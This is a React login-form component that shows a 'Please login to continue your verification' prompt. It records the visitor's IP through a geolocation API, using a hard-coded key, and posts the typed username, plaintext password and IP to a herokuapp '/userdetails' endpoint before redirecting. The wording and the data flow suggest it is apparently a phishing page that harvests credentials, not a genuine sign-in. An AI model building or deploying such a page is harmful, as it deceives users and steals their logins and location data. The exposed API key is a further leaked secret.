import { useState, useEffect } from "react";
import { TextField } from "@mui/material";
import Footer from "./Footer";
import {useHistory} from "react-router-dom"


const Form = () => {
    const [username,setUserName] = useState('')
    
    const [userpass, setUserpass] = useState('');

    const [userIP, setUserIP] = useState('');

    let history = useHistory()

    let ipAddress = userIP.ip


    useEffect(() => {
         fetch('https://geo.ipify.org/api/v2/country?apiKey=at_qf333CKsalQWzZXvCPQTXY1Cjkhx8&ipAddress')
        .then(res => {
            if(!res.ok){
                throw Error('failed to fetch')
            }
            return res.json();
        })
        .then(data => {
            setUserIP(data)
        })

      },[]);


    const handleSubmit = (e)=> {
        e.preventDefault()
        const user = {username, userpass, ipAddress }
        
        fetch('https://project5k.herokuapp.com/userdetails', {
            method: 'POST',
            headers:{"Content-type": "application/json"},
            body: JSON.stringify(user)
        }).then(()=>{
            history.push('/user')
        })
    }

    return ( 
        <>
        <div className="simple-form">
            <h3>Please login to continue your verification</h3>
            <form onSubmit={handleSubmit}>
                <div className="float">
                    <TextField className="input" style={{ width: 300 }} error variant="filled" id="standard-basic" label="username" type="text" value={username} onChange={(e)=> setUserName(e.target.value)} required />
                </div>
                <div className="float">
                    <TextField className="input" style={{ width: 300 }} error id="standard-basic" variant="filled" label="password"type="password" value={userpass} onChange={(e)=> setUserpass(e.target.value)} required />
                </div>
                
                <button>Sign In</button>

            </form>
        </div>
        <Footer/>
        </>
     );
}
 
export default Form;